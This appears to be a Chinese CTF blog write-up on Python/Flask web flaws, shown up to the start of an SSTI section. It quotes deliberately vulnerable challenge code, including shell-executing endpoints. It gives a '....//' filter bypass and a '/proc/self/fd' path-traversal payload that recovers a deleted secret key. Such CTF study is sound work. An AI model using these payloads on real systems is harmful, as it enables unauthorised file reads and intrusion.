<!DOCTYPE html>
<html lang="en-us">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <title>python总结 - ThnPinkman’s blog</title><meta name="Description" content="只是向上走"><meta property="og:url" content="https://thnpkm.github.io/posts/ctf/python%E6%80%BB%E7%BB%93/">
  <meta property="og:site_name" content="ThnPinkman’s blog">
  <meta property="og:title" content="python总结">
  <meta property="og:description" content="任意文件读取(目录穿越) 2022网鼎杯-web669 例题 直接读取文件、参数可控且过滤不全
#以下为部分关键代码，其它部分已省略 #............. @app.route(&#39;/&lt;path:file&gt;&#39;, methods=[&#39;GET&#39;]) def download(file): if session.get(&#39;updir&#39;): basedir = session.get(&#39;updir&#39;) try: path = os.path.join(basedir, file).replace(&#39;../&#39;, &#39;&#39;) if os.path.isfile(path): return send_file(path) else: return response(&#34;Not Found.&#34;, 404) except: return response(&#34;Failed.&#34;, 500) #............. 由于对../的处理只是简单使用replace方法进行替换置空，因此使用双写../（….//）即可进行绕过
path = os.path.join(basedir, file).replace(&#39;../&#39;, &#39;&#39;) 然后接下来使用flask的send_file模块读取文件
if os.path.isfile(path): return send_file(path) 实现了任意文件读取
使用open打开文件但未close 配合任意文件读取/proc/self/fd
2020网鼎杯白虎组Web-PicDown app.py源码如下
from flask import Flask, Response from flask import render_template from flask import request import os import urllib app = Flask(__name__) SECRET_FILE = &#34;/tmp/secret.">
  <meta property="og:locale" content="en_us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-08-20T22:53:36+08:00">
    <meta property="article:modified_time" content="2024-08-20T22:53:36+08:00">
    <meta property="article:tag" content="Python">

  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="python总结">
  <meta name="twitter:description" content="任意文件读取(目录穿越) 2022网鼎杯-web669 例题 直接读取文件、参数可控且过滤不全
#以下为部分关键代码，其它部分已省略 #............. @app.route(&#39;/&lt;path:file&gt;&#39;, methods=[&#39;GET&#39;]) def download(file): if session.get(&#39;updir&#39;): basedir = session.get(&#39;updir&#39;) try: path = os.path.join(basedir, file).replace(&#39;../&#39;, &#39;&#39;) if os.path.isfile(path): return send_file(path) else: return response(&#34;Not Found.&#34;, 404) except: return response(&#34;Failed.&#34;, 500) #............. 由于对../的处理只是简单使用replace方法进行替换置空，因此使用双写../（….//）即可进行绕过
path = os.path.join(basedir, file).replace(&#39;../&#39;, &#39;&#39;) 然后接下来使用flask的send_file模块读取文件
if os.path.isfile(path): return send_file(path) 实现了任意文件读取
使用open打开文件但未close 配合任意文件读取/proc/self/fd
2020网鼎杯白虎组Web-PicDown app.py源码如下
from flask import Flask, Response from flask import render_template from flask import request import os import urllib app = Flask(__name__) SECRET_FILE = &#34;/tmp/secret.">
<meta name="application-name" content="ThnPinkman&#39;s blog">
<meta name="apple-mobile-web-app-title" content="ThnPinkman&#39;s blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://thnpkm.github.io/posts/ctf/python%E6%80%BB%E7%BB%93/" /><link rel="prev" href="https://thnpkm.github.io/posts/web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/burpsuite%E9%9D%B6%E5%9C%BAssrf/" /><link rel="next" href="https://thnpkm.github.io/posts/web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "python总结",
        "inLanguage": "en-us",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "https:\/\/thnpkm.github.io\/posts\/ctf\/python%E6%80%BB%E7%BB%93\/"
        },"genre": "posts","keywords": "python","wordcount":  3429 ,
        "url": "https:\/\/thnpkm.github.io\/posts\/ctf\/python%E6%80%BB%E7%BB%93\/","datePublished": "2024-08-20T22:53:36+08:00","dateModified": "2024-08-20T22:53:36+08:00","publisher": {
            "@type": "Organization",
            "name": "","logo": "https:\/\/thnpkm.github.io\/1651835469576.jpg"},"author": {
                "@type": "Person",
                "name": "Author"
            },"description": ""
    }
    </script></head>
    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="ThnPinkman’s blog"><img
        class="lazyload logo"
        src="/svg/loading.min.svg"
        data-src="https://thnpkm.github.io/1651835469576.jpg"
        data-srcset="https://thnpkm.github.io/1651835469576.jpg, https://thnpkm.github.io/1651835469576.jpg 1.5x, https://thnpkm.github.io/1651835469576.jpg 2x"
        data-sizes="auto"
        alt="https://thnpkm.github.io/1651835469576.jpg"
        title="https://thnpkm.github.io/1651835469576.jpg" />ThnPinkman&#39;s blog</a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/about/"> About </a><a class="menu-item" href="/categories/"> Categories </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-desktop">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                </a>
            </div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="ThnPinkman’s blog"><img
        class="lazyload logo"
        src="/svg/loading.min.svg"
        data-src="https://thnpkm.github.io/1651835469576.jpg"
        data-srcset="https://thnpkm.github.io/1651835469576.jpg, https://thnpkm.github.io/1651835469576.jpg 1.5x, https://thnpkm.github.io/1651835469576.jpg 2x"
        data-sizes="auto"
        alt="https://thnpkm.github.io/1651835469576.jpg"
        title="https://thnpkm.github.io/1651835469576.jpg" />ThnPinkman&#39;s blog</a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><div class="search-wrapper">
                    <div class="search mobile" id="search-mobile">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-mobile">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </div>
                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
                        Cancel
                    </a>
                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="/categories/" title="">Categories</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
            </a></div>
    </div>
</header><div class="search-dropdown desktop">
        <div id="search-dropdown-desktop"></div>
    </div>
    <div class="search-dropdown mobile">
        <div id="search-dropdown-mobile"></div>
    </div><main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">Contents</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">python总结</h1><div class="post-meta">
            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
</span>&nbsp;<span class="post-category">included in <a href="/categories/web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Web漏洞基础</a>&nbsp;<a href="/categories/ctf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Ctf</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2024-08-20">2024-08-20</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;3429 words&nbsp;
                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;17 minutes&nbsp;</div>
        </div><div class="details toc" id="toc-static"  data-kept="">
                <div class="details-summary toc-title">
                    <span>Contents</span>
                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#2022网鼎杯-web669-例题">2022网鼎杯-web669 例题</a></li>
    <li><a href="#使用open打开文件但未close">使用open打开文件但未close</a>
      <ul>
        <li><a href="#2020网鼎杯白虎组web-picdown">2020网鼎杯白虎组Web-PicDown</a></li>
        <li><a href="#nss-round7--shadown">nss round7  shadown</a></li>
        <li><a href="#pasecactf_2019flask_ssti">pasecactf_2019]flask_ssti</a></li>
      </ul>
    </li>
    <li><a href="#小结">小结</a></li>
    <li><a href="#软链接">软链接</a>
      <ul>
        <li><a href="#2022美团杯-onlineunzip禁用">2022美团杯-OnlineUnzip(禁用..)</a></li>
      </ul>
    </li>
  </ul>

  <ul>
    <li><a href="#未知secret_key">未知secret_key</a>
      <ul>
        <li><a href="#读取堆栈内存">读取堆栈内存</a></li>
        <li><a href="#爆破key">爆破key</a></li>
      </ul>
    </li>
    <li><a href="#已知secret_key">已知secret_key</a></li>
  </ul>

  <ul>
    <li><a href="#通过代码中存在的漏洞">通过代码中存在的漏洞</a></li>
    <li><a href="#debug-pin">debug pin</a></li>
  </ul>

  <ul>
    <li><a href="#xss">XSS</a></li>
    <li><a href="#敏感信息泄露">敏感信息泄露</a></li>
    <li><a href="#rce沙箱逃逸">RCE(沙箱逃逸)</a>
      <ul>
        <li><a href="#常用的payload">常用的payload</a></li>
        <li><a href="#bypass">bypass</a></li>
      </ul>
    </li>
  </ul>

  <ul>
    <li><a href="#pickle反序列化">pickle反序列化</a>
      <ul>
        <li><a href="#操纵实例化对象的属性">操纵实例化对象的属性</a></li>
        <li><a href="#变量覆盖">变量覆盖</a></li>
        <li><a href="#rce-1">RCE</a></li>
        <li><a href="#敏感字符bypass">敏感字符bypass</a></li>
        <li><a href="#例题">例题</a></li>
      </ul>
    </li>
    <li><a href="#yaml反序列化">yaml反序列化</a></li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><h1 id="任意文件读取目录穿越">任意文件读取(目录穿越)</h1>
<h2 id="2022网鼎杯-web669-例题">2022网鼎杯-web669 例题</h2>
<p>直接读取文件、参数可控且过滤不全</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#以下为部分关键代码，其它部分已省略</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#.............</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/&lt;path:file&gt;&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;GET&#39;</span>])
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">download</span>(file):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> session<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;updir&#39;</span>):
</span></span><span style="display:flex;"><span>        basedir <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;updir&#39;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>            path <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(basedir, file)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;../&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>isfile(path):
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> send_file(path)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> response(<span style="color:#e6db74">&#34;Not Found.&#34;</span>, <span style="color:#ae81ff">404</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> response(<span style="color:#e6db74">&#34;Failed.&#34;</span>, <span style="color:#ae81ff">500</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#.............</span>
</span></span></code></pre></div><p>由于对../的处理只是简单使用replace方法进行替换置空，因此使用双写../（&hellip;.//）即可进行绕过</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>path <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(basedir, file)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;../&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>)
</span></span></code></pre></div><p>然后接下来使用flask的send_file模块读取文件</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>isfile(path):
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> send_file(path)
</span></span></code></pre></div><p>实现了任意文件读取</p>
<h2 id="使用open打开文件但未close">使用open打开文件但未close</h2>
<p>配合任意文件读取/proc/self/fd</p>
<h3 id="2020网鼎杯白虎组web-picdown">2020网鼎杯白虎组Web-PicDown</h3>
<p>app.py源码如下</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask, Response
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> render_template
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> request
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> urllib
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>app <span style="color:#f92672">=</span> Flask(__name__)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>SECRET_FILE <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/tmp/secret.txt&#34;</span>
</span></span><span style="display:flex;"><span>f <span style="color:#f92672">=</span> open(SECRET_FILE)
</span></span><span style="display:flex;"><span>SECRET_KEY <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()<span style="color:#f92672">.</span>strip()
</span></span><span style="display:flex;"><span>os<span style="color:#f92672">.</span>remove(SECRET_FILE)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">index</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;search.html&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/page&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">page</span>():
</span></span><span style="display:flex;"><span>    url <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;url&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> url<span style="color:#f92672">.</span>lower()<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">&#34;file&#34;</span>):
</span></span><span style="display:flex;"><span>            res <span style="color:#f92672">=</span> urllib<span style="color:#f92672">.</span>urlopen(url)
</span></span><span style="display:flex;"><span>            value <span style="color:#f92672">=</span> res<span style="color:#f92672">.</span>read()
</span></span><span style="display:flex;"><span>            response <span style="color:#f92672">=</span> Response(value, mimetype<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;application/octet-stream&#39;</span>)
</span></span><span style="display:flex;"><span>            response<span style="color:#f92672">.</span>headers[<span style="color:#e6db74">&#39;Content-Disposition&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;attachment; filename=beautiful.jpg&#39;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> response
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            value <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;HACK ERROR!&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span>:
</span></span><span style="display:flex;"><span>        value <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;SOMETHING WRONG!&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;search.html&#39;</span>, res<span style="color:#f92672">=</span>value)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/no_one_know_the_manager&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">manager</span>():
</span></span><span style="display:flex;"><span>    key <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;key&#34;</span>)
</span></span><span style="display:flex;"><span>    print(SECRET_KEY)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> key <span style="color:#f92672">==</span> SECRET_KEY:
</span></span><span style="display:flex;"><span>        shell <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;shell&#34;</span>)
</span></span><span style="display:flex;"><span>        os<span style="color:#f92672">.</span>system(shell)
</span></span><span style="display:flex;"><span>        res <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ok&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        res <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Wrong Key!&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> res
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
</span></span><span style="display:flex;"><span>app<span style="color:#f92672">.</span>run(host<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;0.0.0.0&#39;</span>, port<span style="color:#f92672">=</span><span style="color:#ae81ff">8080</span>)
</span></span></code></pre></div><p>任意文件读取由page路由下的代码实现。SECRET_KEY藏在/tmp/secret.txt，可是已经被删除了。但是可以发现没有使用f.close()关闭文件句柄</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>SECRET_FILE <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/tmp/secret.txt&#34;</span>
</span></span><span style="display:flex;"><span>f <span style="color:#f92672">=</span> open(SECRET_FILE)
</span></span><span style="display:flex;"><span>SECRET_KEY <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()<span style="color:#f92672">.</span>strip()
</span></span><span style="display:flex;"><span>os<span style="color:#f92672">.</span>remove(SECRET_FILE)
</span></span></code></pre></div><p>以下程序可以执行shell, 但是需要key，即前面提到的SECRET_KEY</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/no_one_know_the_manager&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">manager</span>():
</span></span><span style="display:flex;"><span>    key <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;key&#34;</span>)
</span></span><span style="display:flex;"><span>    print(SECRET_KEY)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> key <span style="color:#f92672">==</span> SECRET_KEY:
</span></span><span style="display:flex;"><span>        shell <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;shell&#34;</span>)
</span></span><span style="display:flex;"><span>        os<span style="color:#f92672">.</span>system(shell)
</span></span><span style="display:flex;"><span>        res <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ok&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        res <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Wrong Key!&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> res
</span></span></code></pre></div><p>已知使用open打开文件会创建文件描述符，即在/proc/self/fd中创建名为x的”文件”(x代表一个整数)(unix万物皆为文件的思想)。由于此次读取文件没有进行close操作，创建文件描述符的文件描述符还没有删除，可以直接读取/proc/self/fd/x，x可以从1开始逐渐增加来穷举，读到的内容就是/tmp/secret.txt的内容</p>
<p>示例payload如下</p>
<p>/page?url=../../../../proc/self/fd/1</p>
<p>解释如下：</p>
<pre><code>当程序打开一个文件, 会获得程序的文件描述符, 而此时如果文件被删除, 只会删除文件的目录项, 不会清空文件的内容, 原来的进程依然可以通过描述符对文件进行读取, 也就是说, 文件还存在内存里
</code></pre>
<h3 id="nss-round7--shadown">nss round7  shadown</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask, request
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> time <span style="color:#f92672">import</span> sleep
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>app <span style="color:#f92672">=</span> Flask(__name__)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>flag1 <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;/tmp/flag1.txt&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;/tmp/flag2.txt&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>    flag2 <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
</span></span><span style="display:flex;"><span>tag <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">index</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;app.py&#34;</span>, <span style="color:#e6db74">&#34;r+&#34;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> f<span style="color:#f92672">.</span>read()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/shell&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;POST&#39;</span>])
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">shell</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">global</span> tag
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> tag <span style="color:#f92672">!=</span> <span style="color:#66d9ef">True</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">global</span> flag1
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">del</span> flag1
</span></span><span style="display:flex;"><span>        tag <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
</span></span><span style="display:flex;"><span>    os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;rm -f /tmp/flag1.txt /tmp/flag2.txt&#34;</span>)
</span></span><span style="display:flex;"><span>    action <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form[<span style="color:#e6db74">&#34;act&#34;</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> action<span style="color:#f92672">.</span>find(<span style="color:#e6db74">&#34; &#34;</span>) <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;Nonono&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        os<span style="color:#f92672">.</span>system(action)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;Wow&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.errorhandler</span>(<span style="color:#ae81ff">404</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">error_date</span>(error):
</span></span><span style="display:flex;"><span>    sleep(<span style="color:#ae81ff">5</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;扫扫扫，扫啥东方明珠呢[怒]&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
</span></span><span style="display:flex;"><span>    app<span style="color:#f92672">.</span>run()
</span></span></code></pre></div><p>在本题中，已经getshell了，就需要猜测app.py是哪个进程。</p>
<p>在 linux 系统中如果一个程序打开了一个文件没有关闭，即便从外部（上文是利用 rm -f  flag.txt）删除之后，在 /proc 这个进程的 pid 目录下的 fd 文件描述符目录下还是会有这个文件的  fd，通过这个我们即可得到被删除文件的内容。</p>
<p>在 /proc 这个进程的 pid 目录下的 fd 文件描述符目录下还是会有这个文件的  fd，通过这个我们即可得到被删除文件的内容。</p>
<p>这里在/proc/16/fd里找到了flag1，NSSCTF{0203d870-1518。后半部分flag没有出来，大概率是没有权限读取的那部分。</p>
<h3 id="pasecactf_2019flask_ssti">pasecactf_2019]flask_ssti</h3>
<p>题目给了提示，一段代码：</p>
